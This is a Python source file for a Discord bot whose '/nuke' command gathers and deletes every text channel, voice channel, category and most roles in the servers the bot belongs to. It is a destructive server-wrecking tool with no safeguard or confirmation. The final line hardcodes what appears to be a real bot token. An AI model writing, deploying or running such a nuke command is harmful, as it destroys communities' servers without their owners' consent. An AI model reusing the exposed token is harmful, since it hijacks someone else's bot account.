import nextcord
from nextcord.ext import commands
intents = nextcord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/",help_command=None,intents=intents)

@bot.event
async def on_ready():
    print("Bot on")

@bot.command()
async def nuke(ctx):
    #existing_channel = nextcord.utils.get(guild.channels, name=channel)
    #await existing_channel.delete()
    text_channel_list = []
    voice_channel_list = []
    categories_list = []
    role_list=[]
    for guild in bot.guilds:
        for channel in guild.text_channels:
            text_channel_list.append(channel)
        for channel in guild.voice_channels:
            voice_channel_list.append(channel)
        for channel in guild.categories:
            categories_list.append(channel)
        for channel in guild.roles:
            role_list.append(channel)
        
    for i in range(len(text_channel_list)):
        existing_channel = nextcord.utils.get(guild.channels, name=f'{text_channel_list[i]}')
        await existing_channel.delete()
    for i in range(len(voice_channel_list)):
        existing_channel = nextcord.utils.get(guild.channels, name=f'{voice_channel_list[i]}')
        await existing_channel.delete()
    for i in range(len(categories_list)):
        existing_channel = nextcord.utils.get(guild.channels, name=f'{categories_list[i]}')
        await existing_channel.delete()
    for i in range(1,len(role_list)-2):
        existing_channel = nextcord.utils.get(guild.roles, name=f'{role_list[i]}')
        await existing_channel.delete()
    print("ok")
@bot.command()
async def test(ctx):
    #existing_channel = nextcord.utils.get(guild.channels, name=channel)
    #await existing_channel.delete()
    text_channel_list = []
    voice_channel_list = []
    categories_list = []
    role_list=[]
    for guild in bot.guilds:
        for channel in guild.roles:
            role_list.append(channel)
    print(role_list[1])

bot.run("OTY5OTk1NjY5MzI0NTkxMTg1.GT8jIm.LvWkdnw9GGJA7XnR9hRT-LtDUwGWNqqqlH76ts")